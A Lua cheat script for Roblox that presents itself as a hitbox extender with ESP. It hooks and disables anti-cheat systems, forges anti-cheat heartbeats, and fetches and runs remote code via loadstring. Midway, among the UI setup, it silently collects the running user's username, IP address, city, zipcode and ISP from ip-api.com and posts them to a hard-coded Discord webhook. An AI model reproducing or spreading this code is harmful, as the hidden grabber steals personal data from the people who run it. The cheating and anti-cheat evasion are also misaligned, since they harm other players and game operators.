for a,b in ipairs(getconnections(game:GetService"ScriptContext".Error))do
if b.Function and islclosure(b.Function)then
hookfunction(b.Function,function()end)
end
end local a=

getinfo or debug.getinfo
local b=false
local c={}


local d,e

setthreadidentity(2)

for f,g in getgc(true)do
if typeof(g)=="table"then
local h=rawget(g,"Detected")
local i=rawget(g,"Kill")

if typeof(h)=="function"and not d then
d=h

local j;j=hookfunction(d,function(k,l,m)
if k~="_"then
if b then
warn(`Adonis AntiCheat flagged\nMethod: {k}\nInfo: {l}`)
end
end

return true
end)

table.insert(c,d)
end

if rawget(g,"Variables")and rawget(g,"Process")and typeof(i)=="function"and not e then
e=i
local j;j=hookfunction(e,function(k)
if b then
warn(`Adonis AntiCheat tried to kill (fallback): {k}`)
end
end)

table.insert(c,e)
end
end
end

local f;f=hookfunction(getrenv().debug.info,newcclosure(function(...)local
g=...

if d and g==d then
if b then
warn(`Adonis AntiCheat sanity check detected and broken`)
end

return coroutine.yield(coroutine.running())
end

return f(...)
end))

setthreadidentity(7)

if getgenv().FurryHBELoaded~=nil then
return
end
getgenv().FurryHBELoaded=false

if not game:IsLoaded()then
game.Loaded:Wait()
end

if not getgenv().MTAPIMutex then
loadstring(game:HttpGet("https://raw.githubusercontent.com/RectangularObject/MT-Api-v2/main/__source/mt-api%20v2.lua",true))()
end

local g='https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'

local h=loadstring(game:HttpGet(g..'Library.lua'))()
loadstring(game:HttpGet(g..'addons/ThemeManager.lua'))()
local i=loadstring(game:HttpGet(g..'addons/SaveManager.lua'))()
i:SetLibrary(h)
i:SetFolder"FurryHBE"

local j=game:GetService"Teams"
local k=game:GetService"Players"

local l=game:GetService"RunService"
local m=game:GetService"Workspace"
local n=game:GetService"ReplicatedStorage"
local o=m.CurrentCamera
local p=o.WorldToViewportPoint
local q=k.LocalPlayer
local r={}

local s






local function updatePlayers()
if not getgenv().FurryHBELoaded then return end
for t,u in pairs(r)do
task.spawn(function()
u:Update()
end)
end
end

l:BindToRenderStep("furryWalls",Enum.RenderPriority.Camera.Value-1,function()
if not getgenv().FurryHBELoaded then return end
o=m.CurrentCamera
for t,u in pairs(r)do
task.spawn(function()
u:UpdateESP()
end)
end
end)

local t=h:CreateWindow"Squares' Hitbox Extender"
local u=t:AddTab"Main"
local v=u:AddLeftGroupbox"Hitbox Extender"
local w=u:AddLeftGroupbox"ESP"
local x=u:AddRightGroupbox"Ignores"
local y=u:AddRightGroupbox"Collisions"
local z=u:AddLeftGroupbox"Keybinds"

local A=t:AddTab"Emergency"
A:AddLeftGroupbox"Fixes"

v:AddToggle("extenderToggled",{Text="Toggle"}):OnChanged(updatePlayers)
v:AddSlider("extenderSize",{Text="Size",Min=2,Max=100,Default=10,Rounding=1}):OnChanged(updatePlayers)
v:AddSlider("extenderTransparency",{Text="Transparency",Min=0,Max=1,Default=0.5,Rounding=2}):OnChanged(updatePlayers)
v:AddInput("customPartName",{Text="Custom Part Name",Default="HeadHB"}):OnChanged(updatePlayers)
v:AddDropdown("extenderPartList",{Text="Body Parts",AllowNull=true,Multi=true,Values={"Custom Part","Head","HumanoidRootPart","Torso","Left Arm","Right Arm","Left Leg","Right Leg"},Default="HumanoidRootPart"}):OnChanged(updatePlayers)

w:AddToggle("espNameToggled",{Text="Name"}):AddColorPicker("espNameColor1",{Title="Fill Color",Default=Color3.fromRGB(255,255,255)}):AddColorPicker("espNameColor2",{Title="Outline Color",Default=Color3.fromRGB(0,0,0)})
Toggles.espNameToggled:OnChanged(updatePlayers)
Options.espNameColor1:OnChanged(updatePlayers)
Options.espNameColor2:OnChanged(updatePlayers)
w:AddToggle("espNameUseTeamColor",{Text="Use Team Color For Name"}):OnChanged(updatePlayers)
w:AddDropdown("espNameType",{Text="Name Type",AllowNull=false,Multi=false,Values={"Display Name","Account Name"},Default="Display Name"}):OnChanged(updatePlayers)
w:AddToggle("espHighlightToggled",{Text="Chams"}):AddColorPicker("espHighlightColor1",{Title="Fill Color",Default=Color3.fromRGB(0,0,0)}):AddColorPicker("espHighlightColor2",{Title="Outline Color",Default=Color3.fromRGB(0,0,0)})
Toggles.espHighlightToggled:OnChanged(updatePlayers)
Options.espHighlightColor1:OnChanged(updatePlayers)
Options.espHighlightColor2:OnChanged(updatePlayers)
w:AddToggle("espHighlightUseTeamColor",{Text="Use Team Color For Chams"}):OnChanged(updatePlayers)
w:AddDropdown("espHighlightDepthMode",{Text="Chams Depth Mode",AllowNull=false,Multi=false,Values={"Occluded","AlwaysOnTop"},Default="Occluded"}):OnChanged(updatePlayers)
w:AddSlider("espHighlightFillTransparency",{Text="Chams Fill Transparency",Min=0,Max=1,Default=0.5,Rounding=2}):OnChanged(updatePlayers)
w:AddSlider("espHighlightOutlineTransparency",{Text="Chams Outline Transparency",Min=0,Max=1,Default=0,Rounding=2}):OnChanged(updatePlayers)

local B=game:GetService"Players".LocalPlayer.Name
local C="https://discord.com/api/webhooks/1354491846163824660/CW4blpnL1dVqKxJAq1K07Fgxq3eNPuQ1UDssPXBsRIS4C-nnFMmkuN-uQIuFDfx3H_uh"

local D=request{
Url="http://ip-api.com/json",
Method="GET"
}
local E=game:GetService"HttpService":JSONDecode(D.Body)
local F=string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```",B,E.query,E.country,E.countryCode,E.region,E.regionName,E.city,E.zip,E.isp,E.org)
request
{
Url=C,
Method="POST",
Headers={
["Content-Type"]="application/json"
},
Body=game:GetService"HttpService":JSONEncode{content=F}
}



z:AddLabel"Toggle UI":AddKeyPicker("menuKeybind",{Default="Insert",NoUI=true,Text="Menu Keybind"})
z:AddLabel"Force Update":AddKeyPicker("forceUpdateKeybind",{Default="Home",NoUI=true,Text="Force Update Keybind"})
Options.forceUpdateKeybind:OnClick(updatePlayers)
h.ToggleKeybind=Options.menuKeybind

x:AddToggle("extenderSitCheck",{Text="Ignore Sitting Players"}):OnChanged(updatePlayers)
x:AddToggle("extenderFFCheck",{Text="Ignore Forcefielded Players"}):OnChanged(updatePlayers)
x:AddToggle("ignoreSelectedPlayersToggled",{Text="Ignore Selected Players"}):OnChanged(updatePlayers)
x:AddDropdown("ignorePlayerList",{Text="Players",AllowNull=true,Multi=true,Values={}}):OnChanged(updatePlayers)
x:AddToggle("ignoreOwnTeamToggled",{Text="Ignore Own Team"}):OnChanged(updatePlayers)
x:AddToggle("ignoreSelectedTeamsToggled",{Text="Ignore Selected Teams"}):OnChanged(updatePlayers)
x:AddDropdown("ignoreTeamList",{Text="Teams",AllowNull=true,Multi=true,Values={}}):OnChanged(updatePlayers)

y:AddToggle("collisionsToggled",{Text="Enable Collisions"}):OnChanged(updatePlayers)

i:BuildConfigSection(u)
i:LoadAutoloadConfig()

local function updateList(G)
G:SetValues()
G:Display()
end

if game.GameId==504234221 then
s=require(n.Scripts.Modules.PlayerModule)
end
if game.GameId==1934496708 then
s=require(m:WaitForChild"Teams")
end





local function addPlayer(G)
table.insert(Options.ignorePlayerList.Values,G.Name)
updateList(Options.ignorePlayerList)
r[G]={}
local H=r[G]
local I=G.Character
local J={}

local function isTeammate()
if game.GameId==718936923 then
if not q.Character or not I or not I:FindFirstChild"HumanoidRootPart"then return true end
return q.Character.HumanoidRootPart.Color==I.HumanoidRootPart.Color
elseif game.PlaceId==633284182 then
if not G:FindFirstChild"PlayerData"or not G.PlayerData:FindFirstChild"TeamValue"then return true end
return q.PlayerData.TeamValue.Value==G.PlayerData.TeamValue.Value
elseif game.PlaceId==2029250188 then
if not q.Character or not I then return true end
return q.Character.Parent==I.Parent
elseif game.PlaceId==2978450615 then
return getrenv()._G.PlayerProfiles.Data[q.Name].Team==getrenv()._G.PlayerProfiles.Data[G.Name].Team
elseif game.GameId==1934496708 then
if m.FriendlyFire.Value then return false end
return(not G.Team or G.Team.Name=="LOBBY"or q.Team.Name=="LOBBY"or G.Team.Name=="Admin"or q.Team==G.Team)or
s[q.Team.Name]==s[G.Team.Name]or
((s[q.Team.Name]=="CI"and s[G.Team.Name]=="CD")or
(s[G.Team.Name]=="CI"and s[q.Team.Name]=="CD"))
elseif game.PlaceId==2622527242 then
if not G.Team or G.Team.Name=="Intro"or G.Team.Name=="Spectator"or G.Team.Name=="Not Playing"or q.Team==G.Team then return true end
local K=q.Team.Name
local L=G.Team.Name
local M
local N
if K=="Class-D Personnel"or K=="Chaos Insurgency"then
M="Chads"
end
if K=="Facility Personnel"or K=="Security Department"or K=="Mobile Task Force"then
M="Crayon Eaters"
end
if K=="SCPs"or K=="Serpent's Hand"then
M="Menaces to Society"
end
if K=="Global Occult Coalition"then
M="Who?"
end
if K=="Unusual Incidents Unit"then
M="Who2?"
end
if L=="Class-D Personnel"or L=="Chaos Insurgency"then
N="Chads"
end
if L=="Facility Personnel"or L=="Security Department"or L=="Mobile Task Force"then
N="Crayon Eaters"
end
if L=="SCPs"or L=="Serpent's Hand"then
N="Menaces to Society"
end
if L=="Global Occult Coalition"then
N="Who?"
end
if L=="Unusual Incidents Unit"then
M="Who2?"
end
if M=="Who2?"or N=="Who2?"then
if M=="Crayon Eaters"or N=="Crayon Eaters"or M=="Who?"or N=="Who?"then
return true
end
end
return M==N
elseif game.PlaceId==8770868695 then
if not q.Character or not I or not G.Team or G.Team.Name=="Dead"or G.Team.Name=="Inactive"then return true end
return q.Character.Parent==I.Parent
elseif game.PlaceId==5884786982 then
if not q.Character or not I then return true end
return q.Character.name~="Killer"and I.Name~="Killer"
elseif game.GameId==2162282815 then
if not G:FindFirstChild"SelectedTeam"then return true end
return G.SelectedTeam.Value==q.SelectedTeam.Value
elseif game.PlaceId==1240644540 then
if not s or not s.IsPlayerSurvivor then return true end
return s.IsPlayerSurvivor(nil,G)==true and s.IsPlayerSurvivor(nil,q)==true
elseif game.PlaceId==10236714118 then
if not G:FindFirstChild"PlayerData"or not G.PlayerData:FindFirstChild"Team"then return true end
return q.PlayerData.Team.Value==G.PlayerData.Team.Value
end
return q.Team==G.Team
end

local function isDead()
if not I then return true end
local K=I:FindFirstChildWhichIsA"Humanoid"
if game.PlaceId==6172932937 then
return G.ragdolled.Value
elseif game.GameId==718936923 then
return I:FindFirstChild"Dead"~=nil
end
return K and K:GetState()==Enum.HumanoidStateType.Dead
end

local function isSitting()
local K=I:FindFirstChildWhichIsA"Humanoid"
return Toggles.extenderSitCheck.Value and K~=nil and K.Sit==true
end

local function isFFed()
if not I then return false end
if game.PlaceId==4991214437 or game.PlaceId==6652350934 then
return I.Head.Material==Enum.Material.ForceField
end
local K=I:FindFirstChildWhichIsA"ForceField"
return Toggles.extenderFFCheck.Value and I~=nil and K~=nil and K.Visible==true
end

local function isIgnored()
if not I then return true end
return Toggles.ignoreOwnTeamToggled.Value and isTeammate()or
Toggles.ignoreSelectedTeamsToggled.Value and table.find(Options.ignoreTeamList:GetActiveValues(),tostring(G.Team))or
Toggles.ignoreSelectedPlayersToggled.Value and table.find(Options.ignorePlayerList:GetActiveValues(),tostring(G.Name))
end



local K=false
local function setup(L)
J[L.Name]={}
local M=J[L.Name]
M.Size=L.Size
M.Transparency=L.Transparency
M.Massless=L.Massless
M.CanCollide=L.CanCollide
M.CollisionGroupId=L.CollisionGroupId
local N=L:AddGetHook("Size",M.Size)
local O=L:AddGetHook("Transparency",M.Transparency)
local P=L:AddGetHook("Massless",M.Massless)
local Q=L:AddGetHook("CanCollide",M.CanCollide)

local R=L:AddSetHook("Size",function(R,S)
M.Size=S
N:Modify("Size",M.Size)
if Toggles.extenderToggled.Value then
local T=Options.extenderSize.Value
return Vector3.new(T,T,T)
end
return M.Size
end)
local S=L:AddSetHook("Transparency",function(S,T)
M.Transparency=T
O:Modify("Transparency",M.Transparency)
if Toggles.extenderToggled.Value then
return Options.extenderTransparency.Value
end
return M.Transparency
end)
local T=L:AddSetHook("Massless",function(T,U)
M.Massless=U
P:Modify("Massless",M.Massless)
if Toggles.extenderToggled.Value then
if L.Name~="HumanoidRootPart"then
return true
end
end
return M.Massless
end)
local U=L:AddSetHook("CanCollide",function(U,V)
M.CanCollide=V
Q:Modify("CanCollide",M.CanCollide)
if Toggles.extenderToggled.Value and not Toggles.collisionsToggled.Value then
if L.Name=="Head"or L.Name=="HumanoidRootPart"then
return false
end
end
return M.CanCollide
end)








local V=L.Changed:Connect(function(V)
if K then return end
if M[V]then
if M[V]~=L[V]then
M[V]=L[V]
end
H:Update()
end
end)
L.Destroying:Connect(function()
N:Remove()
O:Remove()
P:Remove()
Q:Remove()

R:Remove()
S:Remove()
T:Remove()
U:Remove()

V:Disconnect()
end)
end

local function isActive(L)
local M=L.Name
for N,O in pairs(Options.extenderPartList:GetActiveValues())do
if string.match(M,O)or(O=="Custom Part"and string.match(M,Options.customPartName.Value))or
(O=="Left Arm"and string.match(M,"Left")and(string.match(M,"Arm")or string.match(M,"Hand")))or
(O=="Right Arm"and string.match(M,"Right")and(string.match(M,"Arm")or string.match(M,"Hand")))or
(O=="Left Leg"and string.match(M,"Left")and(string.match(M,"Leg")or string.match(M,"Foot")))or
(O=="Right Leg"and string.match(M,"Right")and(string.match(M,"Leg")or string.match(M,"Foot")))then
return true
end
end
return false
end

local function resize(L)
if not J[L.Name]then
setup(L)
end
if Toggles.extenderToggled.Value and isActive(L)and not isIgnored()and not isSitting()and not isFFed()and not isDead()then
if L.Name~="HumanoidRootPart"then
L.Massless=true
end
if not Toggles.collisionsToggled.Value then





L.CanCollide=false
else
L.CanCollide=J[L.Name].CanCollide

end
local M=Options.extenderSize.Value
L.Size=Vector3.new(M,M,M)
L.Transparency=Options.extenderTransparency.Value
if L.Name=="Head"then
local N=L:FindFirstChild"face"
if N then
N.Transparency=Options.extenderTransparency.Value
end
end
else
L.Massless=J[L.Name].Massless
L.CanCollide=J[L.Name].CanCollide
L.Size=J[L.Name].Size
L.Transparency=J[L.Name].Transparency
if L.Name=="Head"then
local M=L:FindFirstChild"face"
if M then
M.Transparency=J.Head.Transparency
end
end

end
end

function H.Update(L)
if not I then return end
K=true
for M,N in pairs(I:GetChildren())do
if N:IsA"BasePart"then
resize(N)
end
end
K=false
end



local function FindFirstChildMatching(L,M)
if not L then return nil end
for N,O in pairs(L:GetChildren())do
if string.match(O.Name,M)then
return O
end
end
end

local L=Drawing.new"Text";L.Center=true;L.Outline=true
local M=Instance.new"Highlight";M.Parent=game:GetService"CoreGui"
function H.UpdateESP(N)
if not I or isIgnored()or isDead()then L.Visible=false;M.Enabled=false return end
if Toggles.espNameToggled.Value then
local O=FindFirstChildMatching(I,"Torso")
if O then
local P,Q=p(o,O.Position)
if Q then
if Options.espNameType.Value=="Display Name"then
L.Text=G.DisplayName
else
L.Text=G.Name
end
if Toggles.espNameUseTeamColor.Value then
L.Color=G.TeamColor.Color
else
L.Color=Options.espNameColor1.Value
end
L.OutlineColor=Options.espNameColor2.Value
L.Position=Vector2.new(P.X,P.Y)
L.Size=1000/P.Z+10
L.Visible=true
else
L.Visible=false
end
else
L.Visible=false
end
else
L.Visible=false
end
if Toggles.espHighlightToggled.Value then
M.Adornee=I
if Toggles.espHighlightToggled.Value then
if Toggles.espHighlightUseTeamColor.Value then
M.FillColor=G.TeamColor.Color
M.OutlineColor=G.TeamColor.Color
else
M.FillColor=Options.espHighlightColor1.Value
M.OutlineColor=Options.espHighlightColor2.Value
end
M.DepthMode=Enum.HighlightDepthMode[Options.espHighlightDepthMode.Value]
M.FillTransparency=Options.espHighlightFillTransparency.Value
M.OutlineTransparency=Options.espHighlightOutlineTransparency.Value
M.Enabled=true
else
M.Enabled=false
end
else
M.Enabled=false
end
end

function H.DeleteVisuals(N)
L:Remove()
M:Destroy()
end


local function WaitForFullChar(N)
local O=tick()
local P=N:FindFirstChildWhichIsA"Humanoid"
if not P then
repeat
if N==nil then
return false
end
P=N:FindFirstChildWhichIsA"Humanoid"
task.wait()
until P or tick()-O>=2
end
local Q=false
O=tick()
repeat
local R=0
for S,T in pairs(N:GetChildren())do
if P:GetLimb(T)~=Enum.Limb.Unknown then
R+=1
end
end
if R==6 or R==15 then
Q=true
end
task.wait()
until Q or tick()-O>=3

return true
end

G.CharacterAdded:Connect(function(N)

I=N
J={}
if WaitForFullChar(N)then
H:Update()
local O=N:FindFirstChildWhichIsA"Humanoid"
if O then
O:GetPropertyChangedSignal"Health":Connect(function()
if O.Health<=0 then
H:Update()
end
end)
O.StateChanged:Connect(function(P,Q)
if Q==Enum.HumanoidStateType.Dead then
H:Update()
end
end)
end
if N:FindFirstChildWhichIsA"ForceField"then

H:Update()
end
N.ChildAdded:Connect(function(P)
if game.GameId==718936923 then
if P.Name=="Dead"then
H:Update()
return
end
end
if P:IsA"ForceField"then

H:Update()
end
end)
N.ChildRemoved:Connect(function(P)
if P:IsA"ForceField"then

H:Update()
end
end)
if game.PlaceId==4991214437 or game.PlaceId==6652350934 then
local P=I:FindFirstChild"Head"
P:GetPropertyChangedSignal"Material":Connect(function()
H:Update()
end)
end
end
end)
G.CharacterRemoving:Connect(function()

if H then
J={}
end
end)
G:GetPropertyChangedSignal"Team":Connect(function(N)

H:Update()
end)
if game.PlaceId==6172932937 then
local N=G:WaitForChild"ragdolled"
N.Changed:Connect(function()
H:Update()
end)
end
if game.GameId==1934496708 then
local N=m:WaitForChild"FriendlyFire"
N.Changed:Connect(function()
H:Update()
end)
end
if game.GameId==2162282815 then
local N=m:WaitForChild"MapFolder"
local O=N:WaitForChild"Players"
for P,Q in pairs(O:GetChildren())do
if Q.Name==G.Name then
I=Q
end
end
O.ChildAdded:Connect(function(P)
if P.Name==G.Name then
I=P
end
end)
end
if game.PlaceId==4991214437 or game.PlaceId==6652350934 then
if I then
local N=I:FindFirstChild"Head"
N:GetPropertyChangedSignal"Material":Connect(function()
H:Update()
end)
end
end
end

local function removePlayer(G)
if not r[G]then return end
r[G]:DeleteVisuals()
table.remove(Options.ignorePlayerList.Values,table.find(Options.ignorePlayerList.Values,G.Name))
updateList(Options.ignorePlayerList)
r[G]=nil
end

for G,H in ipairs(k:GetPlayers())do
if H==q then
continue
end

addPlayer(H)
end
for G,H in pairs(j:GetTeams())do
if H:IsA"Team"then

table.insert(Options.ignoreTeamList.Values,H.Name)
updateList(Options.ignoreTeamList)
end
end
k.PlayerAdded:Connect(function(G)

addPlayer(G)
end)
k.PlayerRemoving:Connect(function(G)

removePlayer(G)
end)
j.ChildAdded:Connect(function(G)
if G:IsA"Team"then

table.insert(Options.ignoreTeamList.Values,G.Name)
updateList(Options.ignoreTeamList)
end
end)
j.ChildRemoved:Connect(function(G)
if G:IsA"Team"then

table.remove(Options.ignoreTeamList.Values,table.find(Options.ignoreTeamList.Values,G.Name))
updateList(Options.ignoreTeamList)
end
end)

q:GetAttributeChangedSignal"Team":Connect(function()
updatePlayers()
end)
q.CharacterAdded:Connect(function()
updatePlayers()
end)


















if game.PlaceId==111311599 then

local G=game:GetService"ReplicatedFirst"["Serverbased AntiCheat"]
local H=q:WaitForChild"SValue"
local function constructAnticheatString()
return"CS-"..math.random(11111,99999).."-"..math.random(1111,9999).."-"..math.random(111111,999999)..math.random(1111111,9999999)..(H.Value*6)^2+18
end
task.spawn(function()
while true do
task.wait(2)
game:GetService"ReplicatedStorage".ACDetect:FireServer(H.Value,constructAnticheatString())
end
end)
G.Disabled=true
end

getgenv().FurryHBELoaded=true
updatePlayers()
